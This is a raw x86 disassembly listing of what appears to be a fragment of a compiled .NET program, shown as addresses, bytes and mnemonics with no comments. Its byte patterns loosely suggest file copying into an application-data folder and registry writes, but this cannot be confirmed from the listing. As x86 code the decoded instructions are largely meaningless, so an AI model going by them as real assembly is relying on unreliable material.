  402b01:	d4 00                	aam    $0x0
  402b03:	00 00                	add    %al,(%eax)
  402b05:	1f                   	pop    %ds
  402b06:	0c 8d                	or     $0x8d,%al
  402b08:	14 00                	adc    $0x0,%al
  402b0a:	00 01                	add    %al,(%ecx)
  402b0c:	13 09                	adc    (%ecx),%ecx
  402b0e:	11 09                	adc    %ecx,(%ecx)
  402b10:	16                   	push   %ss
  402b11:	72 2e                	jb     0x402b41
  402b13:	07                   	pop    %es
  402b14:	00 70 a2             	add    %dh,-0x5e(%eax)
  402b17:	11 09                	adc    %ecx,(%ecx)
  402b19:	17                   	pop    %ss
  402b1a:	72 4a                	jb     0x402b66
  402b1c:	07                   	pop    %es
  402b1d:	00 70 a2             	add    %dh,-0x5e(%eax)
  402b20:	11 09                	adc    %ecx,(%ecx)
  402b22:	18 72 72             	sbb    %dh,0x72(%edx)
  402b25:	07                   	pop    %es
  402b26:	00 70 a2             	add    %dh,-0x5e(%eax)
  402b29:	11 09                	adc    %ecx,(%ecx)
  402b2b:	19 72 82             	sbb    %esi,-0x7e(%edx)
  402b2e:	07                   	pop    %es
  402b2f:	00 70 a2             	add    %dh,-0x5e(%eax)
  402b32:	11 09                	adc    %ecx,(%ecx)
  402b34:	1a 72 9c             	sbb    -0x64(%edx),%dh
  402b37:	07                   	pop    %es
  402b38:	00 70 a2             	add    %dh,-0x5e(%eax)
  402b3b:	11 09                	adc    %ecx,(%ecx)
  402b3d:	1b 72 ae             	sbb    -0x52(%edx),%esi
  402b40:	07                   	pop    %es
  402b41:	00 70 a2             	add    %dh,-0x5e(%eax)
  402b44:	11 09                	adc    %ecx,(%ecx)
  402b46:	1c 72                	sbb    $0x72,%al
  402b48:	dc 07                	faddl  (%edi)
  402b4a:	00 70 a2             	add    %dh,-0x5e(%eax)
  402b4d:	11 09                	adc    %ecx,(%ecx)
  402b4f:	1d 72 e8 07 00       	sbb    $0x7e872,%eax
  402b54:	70 a2                	jo     0x402af8
  402b56:	11 09                	adc    %ecx,(%ecx)
  402b58:	1e                   	push   %ds
  402b59:	72 fa                	jb     0x402b55
  402b5b:	07                   	pop    %es
  402b5c:	00 70 a2             	add    %dh,-0x5e(%eax)
  402b5f:	11 09                	adc    %ecx,(%ecx)
  402b61:	1f                   	pop    %ds
  402b62:	09 72 12             	or     %esi,0x12(%edx)
  402b65:	08 00                	or     %al,(%eax)
  402b67:	70 a2                	jo     0x402b0b
  402b69:	11 09                	adc    %ecx,(%ecx)
  402b6b:	1f                   	pop    %ds
  402b6c:	0a 72 1a             	or     0x1a(%edx),%dh
  402b6f:	08 00                	or     %al,(%eax)
  402b71:	70 a2                	jo     0x402b15
  402b73:	11 09                	adc    %ecx,(%ecx)
  402b75:	1f                   	pop    %ds
  402b76:	0b 72 28             	or     0x28(%edx),%esi
  402b79:	08 00                	or     %al,(%eax)
  402b7b:	70 a2                	jo     0x402b1f
  402b7d:	11 09                	adc    %ecx,(%ecx)
  402b7f:	0c 07                	or     $0x7,%al
  402b81:	28 3d 00 00 0a 0d    	sub    %bh,0xd0a0000
  402b87:	16                   	push   %ss
  402b88:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  402b8b:	44                   	inc    %esp
  402b8c:	73 36                	jae    0x402bc4
  402b8e:	00 00                	add    %al,(%eax)
  402b90:	06                   	push   %es
  402b91:	13 06                	adc    (%esi),%eax
  402b93:	09 11                	or     %edx,(%ecx)
  402b95:	04 9a                	add    $0x9a,%al
  402b97:	73 38                	jae    0x402bd1
  402b99:	00 00                	add    %al,(%eax)
  402b9b:	0a 13                	or     (%ebx),%dl
  402b9d:	05 11 06 11 05       	add    $0x5110611,%eax
  402ba2:	6f                   	outsl  %ds:(%esi),(%dx)
  402ba3:	67 00 00             	add    %al,(%bx,%si)
  402ba6:	0a 7d 2d             	or     0x2d(%ebp),%bh
  402ba9:	00 00                	add    %al,(%eax)
  402bab:	04 08                	add    $0x8,%al
  402bad:	11 06                	adc    %eax,(%esi)
  402baf:	fe 06                	incb   (%esi)
  402bb1:	37                   	aaa
  402bb2:	00 00                	add    %al,(%eax)
  402bb4:	06                   	push   %es
  402bb5:	73 30                	jae    0x402be7
  402bb7:	00 00                	add    %al,(%eax)
  402bb9:	0a 28                	or     (%eax),%ch
  402bbb:	01 00                	add    %eax,(%eax)
  402bbd:	00 2b                	add    %ch,(%ebx)
  402bbf:	2d 09 09 11 04       	sub    $0x4110909,%eax
  402bc4:	9a 28 0b 00 00 06 11 	lcall  $0x1106,$0xb28
  402bcb:	04 17                	add    $0x17,%al
  402bcd:	58                   	pop    %eax
  402bce:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402bd1:	04 09                	add    $0x9,%al
  402bd3:	8e 69 32             	mov    0x32(%ecx),%gs
  402bd6:	b5 2b                	mov    $0x2b,%ch
  402bd8:	0b 06                	or     (%esi),%eax
  402bda:	6f                   	outsl  %ds:(%esi),(%dx)
  402bdb:	1b 00                	sbb    (%eax),%eax
  402bdd:	00 0a                	add    %cl,(%edx)
  402bdf:	28 0b                	sub    %cl,(%ebx)
  402be1:	00 00                	add    %al,(%eax)
  402be3:	06                   	push   %es
  402be4:	11 08                	adc    %ecx,(%eax)
  402be6:	17                   	pop    %ss
  402be7:	58                   	pop    %eax
  402be8:	13 08                	adc    (%eax),%ecx
  402bea:	11 08                	adc    %ecx,(%eax)
  402bec:	11 07                	adc    %eax,(%edi)
  402bee:	8e 69 3f             	mov    0x3f(%ecx),%gs
  402bf1:	ee                   	out    %al,(%dx)
  402bf2:	fe                   	(bad)
  402bf3:	ff                   	(bad)
  402bf4:	ff 2a                	ljmp   *(%edx)
  402bf6:	00 00                	add    %al,(%eax)
  402bf8:	1b 30                	sbb    (%eax),%esi
  402bfa:	02 00                	add    (%eax),%al
  402bfc:	e4 00                	in     $0x0,%al
  402bfe:	00 00                	add    %al,(%eax)
  402c00:	12 00                	adc    (%eax),%al
  402c02:	00 11                	add    %dl,(%ecx)
  402c04:	02 0a                	add    (%edx),%cl
  402c06:	28 68 00             	sub    %ch,0x0(%eax)
  402c09:	00 0a                	add    %cl,(%edx)
  402c0b:	6f                   	outsl  %ds:(%esi),(%dx)
  402c0c:	69 00 00 0a 0b 28    	imul   $0x280b0a00,(%eax),%eax
  402c12:	23 00                	and    (%eax),%eax
  402c14:	00 0a                	add    %cl,(%edx)
  402c16:	6f                   	outsl  %ds:(%esi),(%dx)
  402c17:	11 00                	adc    %eax,(%eax)
  402c19:	00 0a                	add    %cl,(%edx)
  402c1b:	0c 1f                	or     $0x1f,%al
  402c1d:	1a 28                	sbb    (%eax),%ch
  402c1f:	13 00                	adc    (%eax),%eax
  402c21:	00 0a                	add    %cl,(%edx)
  402c23:	72 40                	jb     0x402c65
  402c25:	08 00                	or     %al,(%eax)
  402c27:	70 28                	jo     0x402c51
  402c29:	17                   	pop    %ss
  402c2a:	00 00                	add    %al,(%eax)
  402c2c:	0a 0d 09 06 28 17    	or     0x17280609,%cl
  402c32:	00 00                	add    %al,(%eax)
  402c34:	0a 13                	or     (%ebx),%dl
  402c36:	04 07                	add    $0x7,%al
  402c38:	06                   	push   %es
  402c39:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402c3c:	00 0a                	add    %cl,(%edx)
  402c3e:	2d 0d 08 11 04       	sub    $0x411080d,%eax
  402c43:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402c46:	00 0a                	add    %cl,(%edx)
  402c48:	39 9a 00 00 00 08    	cmp    %ebx,0x8000000(%edx)
  402c4e:	28 6a 00             	sub    %ch,0x0(%edx)
  402c51:	00 0a                	add    %cl,(%edx)
  402c53:	13 05 11 04 28 36    	adc    0x36280411,%eax
  402c59:	00 00                	add    %al,(%eax)
  402c5b:	0a 2d 3a 11 04 11    	or     0x1104113a,%ch
  402c61:	05 28 6b 00 00       	add    $0x6b28,%eax
  402c66:	0a 11                	or     (%ecx),%dl
  402c68:	04 73                	add    $0x73,%al
  402c6a:	6c                   	insb   (%dx),%es:(%edi)
  402c6b:	00 00                	add    %al,(%eax)
  402c6d:	0a 13                	or     (%ebx),%dl
  402c6f:	06                   	push   %es
  402c70:	11 06                	adc    %eax,(%esi)
  402c72:	09 6f 6d             	or     %ebp,0x6d(%edi)
  402c75:	00 00                	add    %al,(%eax)
  402c77:	0a 73 6e             	or     0x6e(%ebx),%dh
  402c7a:	00 00                	add    %al,(%eax)
  402c7c:	0a 13                	or     (%ebx),%dl
  402c7e:	07                   	pop    %es
  402c7f:	11 07                	adc    %eax,(%edi)
  402c81:	11 06                	adc    %eax,(%esi)
  402c83:	6f                   	outsl  %ds:(%esi),(%dx)
  402c84:	6f                   	outsl  %ds:(%esi),(%dx)
  402c85:	00 00                	add    %al,(%eax)
  402c87:	0a 11                	or     (%ecx),%dl
  402c89:	07                   	pop    %es
  402c8a:	6f                   	outsl  %ds:(%esi),(%dx)
  402c8b:	70 00                	jo     0x402c8d
  402c8d:	00 0a                	add    %cl,(%edx)
  402c8f:	2c 56                	sub    $0x56,%al
  402c91:	17                   	pop    %ss
  402c92:	28 0a                	sub    %cl,(%edx)
  402c94:	00 00                	add    %al,(%eax)
  402c96:	0a 2a                	or     (%edx),%ch
  402c98:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402c9b:	5b                   	pop    %ebx
  402c9c:	00 00                	add    %al,(%eax)
  402c9e:	0a 20                	or     (%eax),%ah
  402ca0:	c8 00 00 00          	enter  $0x0,$0x0
  402ca4:	28 15 00 00 0a 11    	sub    %dl,0x110a0000
  402caa:	04 11                	add    $0x11,%al
  402cac:	05 28 6b 00 00       	add    $0x6b28,%eax
  402cb1:	0a de                	or     %dh,%bl
  402cb3:	03 26                	add    (%esi),%esp
  402cb5:	de 00                	fiadds (%eax)
  402cb7:	11 04 73             	adc    %eax,(%ebx,%esi,2)
  402cba:	6c                   	insb   (%dx),%es:(%edi)
  402cbb:	00 00                	add    %al,(%eax)
  402cbd:	0a 13                	or     (%ebx),%dl
  402cbf:	08 11                	or     %dl,(%ecx)
  402cc1:	08 09                	or     %cl,(%ecx)
  402cc3:	6f                   	outsl  %ds:(%esi),(%dx)
  402cc4:	6d                   	insl   (%dx),%es:(%edi)
  402cc5:	00 00                	add    %al,(%eax)
  402cc7:	0a 73 6e             	or     0x6e(%ebx),%dh
  402cca:	00 00                	add    %al,(%eax)
  402ccc:	0a 13                	or     (%ebx),%dl
  402cce:	09 11                	or     %edx,(%ecx)
  402cd0:	09 11                	or     %edx,(%ecx)
  402cd2:	08 6f 6f             	or     %ch,0x6f(%edi)
  402cd5:	00 00                	add    %al,(%eax)
  402cd7:	0a 11                	or     (%ecx),%dl
  402cd9:	09 6f 70             	or     %ebp,0x70(%edi)
  402cdc:	00 00                	add    %al,(%eax)
  402cde:	0a 2c 06             	or     (%esi,%eax,1),%ch
  402ce1:	17                   	pop    %ss
  402ce2:	28 0a                	sub    %cl,(%edx)
  402ce4:	00 00                	add    %al,(%eax)
  402ce6:	0a 2a                	or     (%edx),%ch
  402ce8:	01 10                	add    %edx,(%eax)
  402cea:	00 00                	add    %al,(%eax)
  402cec:	00 00                	add    %al,(%eax)
  402cee:	94                   	xchg   %eax,%esp
  402cef:	00 1c b0             	add    %bl,(%eax,%esi,4)
  402cf2:	00 03                	add    %al,(%ebx)
  402cf4:	01 00                	add    %eax,(%eax)
  402cf6:	00 01                	add    %al,(%ecx)
  402cf8:	1b 30                	sbb    (%eax),%esi
  402cfa:	02 00                	add    (%eax),%al
  402cfc:	14 01                	adc    $0x1,%al
  402cfe:	00 00                	add    %al,(%eax)
  402d00:	13 00                	adc    (%eax),%eax
  402d02:	00 11                	add    %dl,(%ecx)
  402d04:	02 0a                	add    (%edx),%cl
  402d06:	28 68 00             	sub    %ch,0x0(%eax)
  402d09:	00 0a                	add    %cl,(%edx)
  402d0b:	6f                   	outsl  %ds:(%esi),(%dx)
  402d0c:	69 00 00 0a 0b 28    	imul   $0x280b0a00,(%eax),%eax
  402d12:	23 00                	and    (%eax),%eax
  402d14:	00 0a                	add    %cl,(%edx)
  402d16:	6f                   	outsl  %ds:(%esi),(%dx)
  402d17:	11 00                	adc    %eax,(%eax)
  402d19:	00 0a                	add    %cl,(%edx)
  402d1b:	0c 1f                	or     $0x1f,%al
  402d1d:	1a 28                	sbb    (%eax),%ch
  402d1f:	13 00                	adc    (%eax),%eax
  402d21:	00 0a                	add    %cl,(%edx)
  402d23:	72 40                	jb     0x402d65
  402d25:	08 00                	or     %al,(%eax)
  402d27:	70 28                	jo     0x402d51
  402d29:	17                   	pop    %ss
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	0a 0d 09 06 28 17    	or     0x17280609,%cl
  402d32:	00 00                	add    %al,(%eax)
  402d34:	0a 13                	or     (%ebx),%dl
  402d36:	04 11                	add    $0x11,%al
  402d38:	04 73                	add    $0x73,%al
  402d3a:	6c                   	insb   (%dx),%es:(%edi)
  402d3b:	00 00                	add    %al,(%eax)
  402d3d:	0a 13                	or     (%ebx),%dl
  402d3f:	0a 11                	or     (%ecx),%dl
  402d41:	0a 17                	or     (%edi),%dl
  402d43:	6f                   	outsl  %ds:(%esi),(%dx)
  402d44:	71 00                	jno    0x402d46
  402d46:	00 0a                	add    %cl,(%edx)
  402d48:	11 0a                	adc    %ecx,(%edx)
  402d4a:	72 44                	jb     0x402d90
  402d4c:	08 00                	or     %al,(%eax)
  402d4e:	70 6f                	jo     0x402dbf
  402d50:	72 00                	jb     0x402d52
  402d52:	00 0a                	add    %cl,(%edx)
  402d54:	11 0a                	adc    %ecx,(%edx)
  402d56:	16                   	push   %ss
  402d57:	6f                   	outsl  %ds:(%esi),(%dx)
  402d58:	73 00                	jae    0x402d5a
  402d5a:	00 0a                	add    %cl,(%edx)
  402d5c:	11 0a                	adc    %ecx,(%edx)
  402d5e:	09 6f 6d             	or     %ebp,0x6d(%edi)
  402d61:	00 00                	add    %al,(%eax)
  402d63:	0a 11                	or     (%ecx),%dl
  402d65:	0a 13                	or     (%ebx),%dl
  402d67:	05 73 6e 00 00       	add    $0x6e73,%eax
  402d6c:	0a 13                	or     (%ebx),%dl
  402d6e:	06                   	push   %es
  402d6f:	11 06                	adc    %eax,(%esi)
  402d71:	11 05 6f 6f 00 00    	adc    %eax,0x6f6f
  402d77:	0a 07                	or     (%edi),%al
  402d79:	06                   	push   %es
  402d7a:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402d7d:	00 0a                	add    %cl,(%edx)
  402d7f:	2d 0d 08 11 04       	sub    $0x411080d,%eax
  402d84:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402d87:	00 0a                	add    %cl,(%edx)
  402d89:	39 89 00 00 00 08    	cmp    %ecx,0x8000000(%ecx)
  402d8f:	28 6a 00             	sub    %ch,0x0(%edx)
  402d92:	00 0a                	add    %cl,(%edx)
  402d94:	13 07                	adc    (%edi),%eax
  402d96:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402d99:	36 00 00             	add    %al,%ss:(%eax)
  402d9c:	0a 2d 31 11 04 11    	or     0x11041131,%ch
  402da2:	07                   	pop    %es
  402da3:	28 6b 00             	sub    %ch,0x0(%ebx)
  402da6:	00 0a                	add    %cl,(%edx)
  402da8:	11 05 28 74 00 00    	adc    %eax,0x7428
  402dae:	0a 26                	or     (%esi),%ah
  402db0:	17                   	pop    %ss
  402db1:	28 0a                	sub    %cl,(%edx)
  402db3:	00 00                	add    %al,(%eax)
  402db5:	0a de                	or     %dh,%bl
  402db7:	5f                   	pop    %edi
  402db8:	13 08                	adc    (%eax),%ecx
  402dba:	11 08                	adc    %ecx,(%eax)
  402dbc:	6f                   	outsl  %ds:(%esi),(%dx)
  402dbd:	75 00                	jne    0x402dbf
  402dbf:	00 0a                	add    %cl,(%edx)
  402dc1:	20 c7                	and    %al,%bh
  402dc3:	04 00                	add    $0x0,%al
  402dc5:	00 33                	add    %dh,(%ebx)
  402dc7:	06                   	push   %es
  402dc8:	02 28                	add    (%eax),%ch
  402dca:	15 00 00 06 de       	adc    $0xde060000,%eax
  402dcf:	47                   	inc    %edi
  402dd0:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402dd3:	5b                   	pop    %ebx
  402dd4:	00 00                	add    %al,(%eax)
  402dd6:	0a 20                	or     (%eax),%ah
  402dd8:	c8 00 00 00          	enter  $0x0,$0x0
  402ddc:	28 15 00 00 0a 11    	sub    %dl,0x110a0000
  402de2:	04 11                	add    $0x11,%al
  402de4:	07                   	pop    %es
  402de5:	28 6b 00             	sub    %ch,0x0(%ebx)
  402de8:	00 0a                	add    %cl,(%edx)
  402dea:	de 03                	fiadds (%ebx)
  402dec:	26 de 00             	fiadds %es:(%eax)
  402def:	11 05 28 74 00 00    	adc    %eax,0x7428
  402df5:	0a 26                	or     (%esi),%ah
  402df7:	17                   	pop    %ss
  402df8:	28 0a                	sub    %cl,(%edx)
  402dfa:	00 00                	add    %al,(%eax)
  402dfc:	0a de                	or     %dh,%bl
  402dfe:	18 13                	sbb    %dl,(%ebx)
  402e00:	09 11                	or     %edx,(%ecx)
  402e02:	09 6f 75             	or     %ebp,0x75(%edi)
  402e05:	00 00                	add    %al,(%eax)
  402e07:	0a 20                	or     (%eax),%ah
  402e09:	c7 04 00 00 33 06 02 	movl   $0x2063300,(%eax,%eax,1)
  402e10:	28 15 00 00 06 de    	sub    %dl,0xde060000
  402e16:	00 2a                	add    %ch,(%edx)
  402e18:	01 28                	add    %ebp,(%eax)
  402e1a:	00 00                	add    %al,(%eax)
  402e1c:	00 00                	add    %al,(%eax)
  402e1e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402e1f:	00 10                	add    %dl,(%eax)
  402e21:	b4 00                	mov    $0x0,%ah
  402e23:	18 4b 00             	sbb    %cl,0x0(%ebx)
  402e26:	00 01                	add    %al,(%ecx)
  402e28:	00 00                	add    %al,(%eax)
  402e2a:	cc                   	int3
  402e2b:	00 1c e8             	add    %bl,(%eax,%ebp,8)
  402e2e:	00 03                	add    %al,(%ebx)
  402e30:	01 00                	add    %eax,(%eax)
  402e32:	00 01                	add    %al,(%ecx)
  402e34:	00 00                	add    %al,(%eax)
  402e36:	eb 00                	jmp    0x402e38
  402e38:	10 fb                	adc    %bh,%bl
  402e3a:	00 18                	add    %bl,(%eax)
  402e3c:	4b                   	dec    %ebx
  402e3d:	00 00                	add    %al,(%eax)
  402e3f:	01 1b                	add    %ebx,(%ebx)
  402e41:	30 04 00             	xor    %al,(%eax,%eax,1)
  402e44:	86 00                	xchg   %al,(%eax)
  402e46:	00 00                	add    %al,(%eax)
  402e48:	14 00                	adc    $0x0,%al
  402e4a:	00 11                	add    %dl,(%ecx)
  402e4c:	1d 28 13 00 00       	sbb    $0x1328,%eax
  402e51:	0a 0a                	or     (%edx),%cl
  402e53:	28 1f                	sub    %bl,(%edi)
  402e55:	00 00                	add    %al,(%eax)
  402e57:	0a 6f 76             	or     0x76(%edi),%ch
  402e5a:	00 00                	add    %al,(%eax)
  402e5c:	0a 0b                	or     (%ebx),%cl
  402e5e:	06                   	push   %es
  402e5f:	72 40                	jb     0x402ea1
  402e61:	08 00                	or     %al,(%eax)
  402e63:	70 07                	jo     0x402e6c
  402e65:	72 50                	jb     0x402eb7
  402e67:	08 00                	or     %al,(%eax)
  402e69:	70 28                	jo     0x402e93
  402e6b:	77 00                	ja     0x402e6d
  402e6d:	00 0a                	add    %cl,(%edx)
  402e6f:	73 78                	jae    0x402ee9
  402e71:	00 00                	add    %al,(%eax)
  402e73:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  402e76:	23 00                	and    (%eax),%eax
  402e78:	00 0a                	add    %cl,(%edx)
  402e7a:	6f                   	outsl  %ds:(%esi),(%dx)
  402e7b:	11 00                	adc    %eax,(%eax)
  402e7d:	00 0a                	add    %cl,(%edx)
  402e7f:	0d 08 72 5a 08       	or     $0x85a7208,%eax
  402e84:	00 70 6f             	add    %dh,0x6f(%eax)
  402e87:	79 00                	jns    0x402e89
  402e89:	00 0a                	add    %cl,(%edx)
  402e8b:	08 72 80             	or     %dh,-0x80(%edx)
  402e8e:	08 00                	or     %al,(%eax)
  402e90:	70 09                	jo     0x402e9b
  402e92:	28 17                	sub    %dl,(%edi)
  402e94:	00 00                	add    %al,(%eax)
  402e96:	0a 6f 79             	or     0x79(%edi),%ch
  402e99:	00 00                	add    %al,(%eax)
  402e9b:	0a 08                	or     (%eax),%cl
  402e9d:	72 9a                	jb     0x402e39
  402e9f:	08 00                	or     %al,(%eax)
  402ea1:	70 6f                	jo     0x402f12
  402ea3:	79 00                	jns    0x402ea5
  402ea5:	00 0a                	add    %cl,(%edx)
  402ea7:	09 1f                	or     %ebx,(%edi)
  402ea9:	5c                   	pop    %esp
  402eaa:	1f                   	pop    %ds
  402eab:	2f                   	das
  402eac:	6f                   	outsl  %ds:(%esi),(%dx)
  402ead:	7a 00                	jp     0x402eaf
  402eaf:	00 0a                	add    %cl,(%edx)
  402eb1:	13 04 08             	adc    (%eax,%ecx,1),%eax
  402eb4:	72 b2                	jb     0x402e68
  402eb6:	08 00                	or     %al,(%eax)
  402eb8:	70 11                	jo     0x402ecb
  402eba:	04 28                	add    $0x28,%al
  402ebc:	17                   	pop    %ss
  402ebd:	00 00                	add    %al,(%eax)
  402ebf:	0a 6f 79             	or     0x79(%edi),%ch
  402ec2:	00 00                	add    %al,(%eax)
  402ec4:	0a de                	or     %dh,%bl
  402ec6:	0a 08                	or     (%eax),%cl
  402ec8:	2c 06                	sub    $0x6,%al
  402eca:	08 6f 1d             	or     %ch,0x1d(%edi)
  402ecd:	00 00                	add    %al,(%eax)
  402ecf:	0a dc                	or     %ah,%bl
  402ed1:	2a 00                	sub    (%eax),%al
  402ed3:	00 01                	add    %al,(%ecx)
  402ed5:	10 00                	adc    %al,(%eax)
  402ed7:	00 02                	add    %al,(%edx)
  402ed9:	00 29                	add    %ch,(%ecx)
  402edb:	00 52 7b             	add    %dl,0x7b(%edx)
  402ede:	00 0a                	add    %cl,(%edx)
  402ee0:	00 00                	add    %al,(%eax)
  402ee2:	00 00                	add    %al,(%eax)
  402ee4:	1b 30                	sbb    (%eax),%esi
  402ee6:	03 00                	add    (%eax),%eax
  402ee8:	41                   	inc    %ecx
  402ee9:	00 00                	add    %al,(%eax)
  402eeb:	00 15 00 00 11 1f    	add    %dl,0x1f110000
  402ef1:	1a 28                	sbb    (%eax),%ch
  402ef3:	13 00                	adc    (%eax),%eax
  402ef5:	00 0a                	add    %cl,(%edx)
  402ef7:	72 40                	jb     0x402f39
  402ef9:	08 00                	or     %al,(%eax)
  402efb:	70 7e                	jo     0x402f7b
  402efd:	11 00                	adc    %eax,(%eax)
  402eff:	00 04 28             	add    %al,(%eax,%ebp,1)
  402f02:	35 00 00 0a 0a       	xor    $0xa0a0000,%eax
  402f07:	06                   	push   %es
  402f08:	28 36                	sub    %dh,(%esi)
  402f0a:	00 00                	add    %al,(%eax)
  402f0c:	0a 2d 0b 06 7e 1d    	or     0x1d7e060b,%ch
  402f12:	00 00                	add    %al,(%eax)
  402f14:	04 28                	add    $0x28,%al
  402f16:	37                   	aaa
  402f17:	00 00                	add    %al,(%eax)
  402f19:	0a 20                	or     (%eax),%ah
  402f1b:	f4                   	hlt
  402f1c:	01 00                	add    %eax,(%eax)
  402f1e:	00 28                	add    %ch,(%eax)
  402f20:	15 00 00 0a 06       	adc    $0x60a0000,%eax
  402f25:	28 7b 00             	sub    %bh,0x0(%ebx)
  402f28:	00 0a                	add    %cl,(%edx)
  402f2a:	26 de 03             	fiadds %es:(%ebx)
  402f2d:	26 de 00             	fiadds %es:(%eax)
  402f30:	2a 00                	sub    (%eax),%al
  402f32:	00 00                	add    %al,(%eax)
  402f34:	01 10                	add    %edx,(%eax)
  402f36:	00 00                	add    %al,(%eax)
  402f38:	00 00                	add    %al,(%eax)
  402f3a:	17                   	pop    %ss
  402f3b:	00 26                	add    %ah,(%esi)
  402f3d:	3d 00 03 01 00       	cmp    $0x10300,%eax
  402f42:	00 01                	add    %al,(%ecx)
  402f44:	1b 30                	sbb    (%eax),%esi
  402f46:	03 00                	add    (%eax),%eax
  402f48:	62 00                	bound  %eax,(%eax)
  402f4a:	00 00                	add    %al,(%eax)
  402f4c:	16                   	push   %ss
  402f4d:	00 00                	add    %al,(%eax)
  402f4f:	11 28                	adc    %ebp,(%eax)
  402f51:	23 00                	and    (%eax),%eax
  402f53:	00 0a                	add    %cl,(%edx)
  402f55:	6f                   	outsl  %ds:(%esi),(%dx)
  402f56:	11 00                	adc    %eax,(%eax)
  402f58:	00 0a                	add    %cl,(%edx)
  402f5a:	0a 1f                	or     (%edi),%bl
  402f5c:	1a 28                	sbb    (%eax),%ch
  402f5e:	13 00                	adc    (%eax),%eax
  402f60:	00 0a                	add    %cl,(%edx)
  402f62:	72 40                	jb     0x402fa4
  402f64:	08 00                	or     %al,(%eax)
  402f66:	70 7e                	jo     0x402fe6
  402f68:	0a 00                	or     (%eax),%al
  402f6a:	00 04 28             	add    %al,(%eax,%ebp,1)
  402f6d:	35 00 00 0a 0b       	xor    $0xb0a0000,%eax
  402f72:	1f                   	pop    %ds
  402f73:	1a 28                	sbb    (%eax),%ch
  402f75:	13 00                	adc    (%eax),%eax
  402f77:	00 0a                	add    %cl,(%edx)
  402f79:	72 40                	jb     0x402fbb
  402f7b:	08 00                	or     %al,(%eax)
  402f7d:	70 7e                	jo     0x402ffd
  402f7f:	11 00                	adc    %eax,(%eax)
  402f81:	00 04 28             	add    %al,(%eax,%ebp,1)
  402f84:	35 00 00 0a 0c       	xor    $0xc0a0000,%eax
  402f89:	06                   	push   %es
  402f8a:	07                   	pop    %es
  402f8b:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402f8e:	00 0a                	add    %cl,(%edx)
  402f90:	2c 0b                	sub    $0xb,%al
  402f92:	08 28                	or     %ch,(%eax)
  402f94:	5b                   	pop    %ebx
  402f95:	00 00                	add    %al,(%eax)
  402f97:	0a de                	or     %dh,%bl
  402f99:	03 26                	add    (%esi),%esp
  402f9b:	de 00                	fiadds (%eax)
  402f9d:	08 28                	or     %ch,(%eax)
  402f9f:	36 00 00             	add    %al,%ss:(%eax)
  402fa2:	0a 2c 0b             	or     (%ebx,%ecx,1),%ch
  402fa5:	06                   	push   %es
  402fa6:	07                   	pop    %es
  402fa7:	28 0f                	sub    %cl,(%edi)
  402fa9:	00 00                	add    %al,(%eax)
  402fab:	0a 2c 02             	or     (%edx,%eax,1),%ch
  402fae:	17                   	pop    %ss
  402faf:	2a 16                	sub    (%esi),%dl
  402fb1:	2a 00                	sub    (%eax),%al
  402fb3:	00 01                	add    %al,(%ecx)
  402fb5:	10 00                	adc    %al,(%eax)
  402fb7:	00 00                	add    %al,(%eax)
  402fb9:	00 42 00             	add    %al,0x0(%edx)
  402fbc:	08 4a 00             	or     %cl,0x0(%edx)
  402fbf:	03 01                	add    (%ecx),%eax
  402fc1:	00 00                	add    %al,(%eax)
  402fc3:	01 1b                	add    %ebx,(%ebx)
  402fc5:	30 03                	xor    %al,(%ebx)
  402fc7:	00 2c 00             	add    %ch,(%eax,%eax,1)
  402fca:	00 00                	add    %al,(%eax)
  402fcc:	17                   	pop    %ss
  402fcd:	00 00                	add    %al,(%eax)
  402fcf:	11 7e 16             	adc    %edi,0x16(%esi)
  402fd2:	00 00                	add    %al,(%eax)
  402fd4:	0a 72 c6             	or     -0x3a(%edx),%dh
  402fd7:	08 00                	or     %al,(%eax)
  402fd9:	70 17                	jo     0x402ff2
  402fdb:	6f                   	outsl  %ds:(%esi),(%dx)
  402fdc:	7c 00                	jl     0x402fde
  402fde:	00 0a                	add    %cl,(%edx)
  402fe0:	0a 06                	or     (%esi),%al
  402fe2:	72 22                	jb     0x403006
  402fe4:	09 00                	or     %eax,(%eax)
  402fe6:	70 28                	jo     0x403010
  402fe8:	23 00                	and    (%eax),%eax
  402fea:	00 0a                	add    %cl,(%edx)
  402fec:	6f                   	outsl  %ds:(%esi),(%dx)
  402fed:	11 00                	adc    %eax,(%eax)
  402fef:	00 0a                	add    %cl,(%edx)
  402ff1:	6f                   	outsl  %ds:(%esi),(%dx)
  402ff2:	7d 00                	jge    0x402ff4
  402ff4:	00 0a                	add    %cl,(%edx)
  402ff6:	de 03                	fiadds (%ebx)
  402ff8:	26 de 00             	fiadds %es:(%eax)
  402ffb:	2a 01                	sub    (%ecx),%al
  402ffd:	10 00                	adc    %al,(%eax)
  402fff:	00 00                	add    %al,(%eax)
  403001:	00 00                	add    %al,(%eax)
  403003:	00 28                	add    %ch,(%eax)
  403005:	28 00                	sub    %al,(%eax)
  403007:	03 01                	add    (%ecx),%eax
  403009:	00 00                	add    %al,(%eax)
  40300b:	01 1b                	add    %ebx,(%ebx)
  40300d:	30 03                	xor    %al,(%ebx)
  40300f:	00 63 00             	add    %ah,0x0(%ebx)
  403012:	00 00                	add    %al,(%eax)
  403014:	18 00                	sbb    %al,(%eax)
  403016:	00 11                	add    %dl,(%ecx)
  403018:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  40301c:	0a 0b                	or     (%ebx),%cl
  40301e:	16                   	push   %ss
  40301f:	0c 2b                	or     $0x2b,%al
  403021:	52                   	push   %edx
  403022:	07                   	pop    %es
  403023:	08 9a 0a 06 6f 1b    	or     %bl,0x1b6f060a(%edx)
  403029:	00 00                	add    %al,(%eax)
  40302b:	0a 28                	or     (%eax),%ch
  40302d:	65 00 00             	add    %al,%gs:(%eax)
  403030:	0a 28                	or     (%eax),%ch
  403032:	66 00 00             	data16 add %al,(%eax)
  403035:	0a 28                	or     (%eax),%ch
  403037:	14 00                	adc    $0x0,%al
  403039:	00 0a                	add    %cl,(%edx)
  40303b:	2c 33                	sub    $0x33,%al
  40303d:	06                   	push   %es
